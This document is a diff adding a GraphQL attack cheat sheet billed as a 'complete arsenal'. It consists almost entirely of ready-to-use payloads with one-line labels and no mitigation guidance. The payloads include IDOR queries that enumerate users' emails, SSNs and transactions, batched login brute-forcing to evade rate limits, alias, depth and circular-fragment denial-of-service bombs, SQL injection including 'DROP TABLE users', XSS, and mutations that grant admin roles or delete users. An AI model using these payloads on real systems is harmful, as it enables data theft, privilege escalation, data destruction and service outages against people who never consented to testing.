@@ -1,0 +1,323 @@
+================================================================================
+GRAPHQL PAYLOADS - COMPLETE ARSENAL
+================================================================================
+
+================================================================================
+BASIC GRAPHQL DETECTION PAYLOADS
+================================================================================
+
+{__typename} – Basic query to check if GraphQL is running
+{__schema{types{name}}} – Introspection query
+{__type(name:"User"){name fields{name}}} – Get type details
+query { __typename } – Explicit query keyword
+mutation { __typename } – Mutation keyword
+subscription { __typename } – Subscription keyword
+
+================================================================================
+INTROSPECTION QUERIES (Schema Extraction)
+================================================================================
+
+{__schema{types{name,kind,description,fields{name,type{name,kind}}}}} – Full schema dump
+{__schema{queryType{fields{name,args{name,type{name}}}}}} – Query fields only
+{__schema{mutationType{fields{name,args{name,type{name}}}}}} – Mutation fields only
+{__schema{subscriptionType{fields{name}}}} – Subscription fields only
+{__schema{types{name,fields{name}}}} – Types and fields
+{__type(name:"Query"){fields{name}}} – Query type detail
+{__type(name:"Mutation"){fields{name}}} – Mutation type detail
+{__type(name:"Subscription"){fields{name}}} – Subscription detail
+{__schema{directives{name,description}}} – List directives
+
+================================================================================
+ADVANCED INTROSPECTION QUERIES
+================================================================================
+
+{
+  __schema {
+    types {
+      name
+      kind
+      description
+      fields {
+        name
+        type {
+          name
+          kind
+          ofType {
+            name
+            kind
+          }
+        }
+        args {
+          name
+          type {
+            name
+            kind
+            ofType {
+              name
+              kind
+            }
+          }
+        }
+      }
+      inputFields {
+        name
+        type {
+          name
+          kind
+        }
+      }
+      interfaces {
+        name
+      }
+      enumValues {
+        name
+      }
+      possibleTypes {
+        name
+      }
+    }
+  }
+} – Complete schema extraction
+
+================================================================================
+GRAPHQL IDOR PAYLOADS (Horizontal Privilege Escalation)
+================================================================================
+
+{ user(id: 1) { id name email } } – Get user by ID
+{ user(id: 2) { id name email } } – Get different user
+{ user(id: 3) { id name email role } } – Include role
+{ user(id: 1) { ...userFields } } fragment userFields on User { id name email phone address ssn } – Data extraction via fragment
+query { user1: user(id: 1) { name }, user2: user(id: 2) { name }, user3: user(id: 3) { name } } – Batch user enumeration
+{ users(ids: [1,2,3,4,5]) { id name email } } – Array-based enumeration
+{ searchUsers(filter: {id: 1}) { id name } } – Filter-based query
+{ getUserByEmail(email: "user@example.com") { id name role } } – Email-based lookup
+
+================================================================================
+GRAPHQL IDOR WITH NESTED RESOLVERS
+================================================================================
+
+{ user(id: 1) { posts { id title content comments { id text author { name } } } } } – Nested data access
+{ organization(id: 1) { name users { id name email role } } } – Organization-level access
+{ organization(id: 1) { name } organization(id: 2) { name } } – Cross-org query
+{ account(id: 1) { transactions { amount recipient } } } – Financial data access
+
+================================================================================
+GRAPHQL BATCH QUERY ATTACKS (Bypass Rate Limiting)
+================================================================================
+
+[
+  { "query": "query { user(id: 1) { name } }" },
+  { "query": "query { user(id: 2) { name } }" },
+  { "query": "query { user(id: 3) { name } }" },
+  { "query": "query { user(id: 4) { name } }" },
+  { "query": "query { user(id: 5) { name } }" }
+] – 5 queries in one request
+[
+  { "query": "mutation { login(email: \"admin@example.com\", password: \"admin123\") { token } }" },
+  { "query": "mutation { login(email: \"admin@example.com\", password: \"password\") { token } }" }
+] – Batch authentication testing
+
+================================================================================
+GRAPHQL ALIAS BOMB ATTACKS (Resource Exhaustion)
+================================================================================
+
+query {
+  a1: user(id: 1) { name }
+  a2: user(id: 2) { name }
+  a3: user(id: 3) { name }
+  a4: user(id: 4) { name }
+  a5: user(id: 5) { name }
+  a6: user(id: 6) { name }
+  a7: user(id: 7) { name }
+  a8: user(id: 8) { name }
+  a9: user(id: 9) { name }
+  a10: user(id: 10) { name }
+} – Multiple aliases (can repeat hundreds of times)
+
+{
+  a1: __typename
+  a2: __typename
+  a3: __typename
+  ... (repeat 1000+ times)
+} – Alias bomb on simple field
+
+================================================================================
+GRAPHQL NESTED QUERY BOMB (Depth Attack)
+================================================================================
+
+query {
+  user(id: 1) {
+    friends {
+      friends {
+        friends {
+          friends {
+            friends {
+              friends {
+                friends {
+                  friends {
+                    name
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+} – Deep nesting (10+ levels)
+
+================================================================================
+GRAPHQL CIRCULAR FRAGMENT ATTACK
+================================================================================
+
+fragment A on User {
+  id
+  friends {
+    ...B
+  }
+}
+fragment B on User {
+  id
+  friends {
+    ...A
+  }
+}
+query {
+  user(id: 1) {
+    ...A
+  }
+} – Circular fragment reference
+
+================================================================================
+GRAPHQL FIELD DUPLICATION ATTACK
+================================================================================
+
+{
+  user(id: 1) {
+    name
+    name
+    name
+    name
+    name
+    name
+    name
+    name
+  }
+} – Duplicate fields
+
+{
+  user(id: 1) {
+    id id id id id id id id id id
+    name name name name name name
+    email email email email email
+    role role role role role role
+  }
+} – Multiple field duplicates
+
+================================================================================
+GRAPHQL INJECTION PAYLOADS (SQL/NoSQL/XSS)
+================================================================================
+
+{ search(term: "1' OR '1'='1") { results } } – SQL injection
+{ search(term: "{\"$ne\": null}") { results } } – NoSQL injection
+{ user(username: "admin' OR '1'='1") { id name } } – SQL in username
+mutation { updateProfile(bio: "<script>alert(1)</script>") { success } } – XSS injection
+{ user(id: "1; DROP TABLE users; --") { name } } – SQL injection in ID
+
+================================================================================
+GRAPHQL AUTHENTICATION BYPASS PAYLOADS
+================================================================================
+
+query { __schema { types { name } } } – Unauthenticated introspection
+{ viewer { id name email role } } – Viewer query (may return current user)
+{ me { id name email } } – Me query (current user)
+{ currentUser { id name role } } – Current user query
+{ profile { id name email } } – Profile query
+
+================================================================================
+GRAPHQL PRIVILEGE ESCALATION PAYLOADS
+================================================================================
+
+{ users { id name email role } } – List all users (admin only)
+{ roles { name permissions } } – List roles
+{ permissions { name resource } } – List permissions
+mutation { updateUserRole(userId: 1, role: "ADMIN") { success } } – Role escalation
+mutation { makeAdmin(userId: 2) { user { role } } } – Make admin mutation
+mutation { deleteUser(userId: 3) { success } } – Delete user (admin action)
+
+================================================================================
+GRAPHQL ERROR DISCLOSURE PAYLOADS
+================================================================================
+
+{ invalidField } – Field doesn't exist (reveals schema hints)
+{ user(id: "invalid") { id } } – Invalid type
+{ user(id: null) { id } } – Null injection
+{ user(id: "1'") { id } } – Quote injection
+{ user(id: "1") { nonexistent } } – Missing field
+{ __type(name: "InvalidType") { name } } – Invalid type name
+
+================================================================================
+GRAPHQL RATE LIMIT BYPASS PAYLOADS
+================================================================================
+
+[{"query":"{__typename}"},{"query":"{__typename}"},...] – Batch bypass
+query { a1:__typename a2:__typename a3:__typename ... } – Alias bypass
+
+================================================================================
+GRAPHQL FIELD SUGGESTION (Type Discovery)
+================================================================================
+
+{ __schema { queryType { fields { name } } } } – All query fields
+{ __schema { mutationType { fields { name } } } } – All mutation fields
+{ __type(name: "Query") { fields { name args { name type { name } } } } } – Queries with arguments
+{ __type(name: "User") { fields { name type { name } } } } – User type fields
+
+================================================================================
+GRAPHQL COMMON QUERIES FOR ENUMERATION
+================================================================================
+
+{ users { id name email } } – Users list
+{ items { id name description } } – Items list
+{ products { id name price } } – Products list
+{ orders { id total status } } – Orders list
+{ transactions { id amount date } } – Transactions list
+{ messages { id from to subject } } – Messages list
+{ comments { id text author } } – Comments list
+{ posts { id title content author } } – Posts list
+
+================================================================================
+GRAPHQL REAL-WORLD NOTABLE PAYLOADS
+================================================================================
+
+{ shop { name products { id name price } } } – Shopify GraphQL (2019)
+{ viewer { login } } – GitHub GraphQL (2020)
+mutation { login(email: "admin@example.com", password: "admin123") { token } } – Authentication mutation
+
+================================================================================
+GRAPHQL RESPONSE INDICATORS (What to Look For)
+================================================================================
+
+"data": { – Successful response
+"errors": [ – Error in response
+"extensions": { – Extensions field
+"__typename" – Typename in response
+"introspection" – Schema data returned
+"Query root type" – Schema description
+"locations" – Error location
+"validation" – Validation error
+
+================================================================================
+GRAPHQL TOOL COMMANDS
+================================================================================
+
+graphqlvoyager – Visualize schema
+graphiql – Interactive GraphQL IDE
+altair – Advanced GraphQL client
+clairvoyance --url https://target.com/graphql – Introspection brute-force
+graphw00f -d -t https://target.com/graphql – GraphQL fingerprinting
+inql – GraphQL security scanner
+
+================================================================================
+END OF GRAPHQL PAYLOADS
+================================================================================
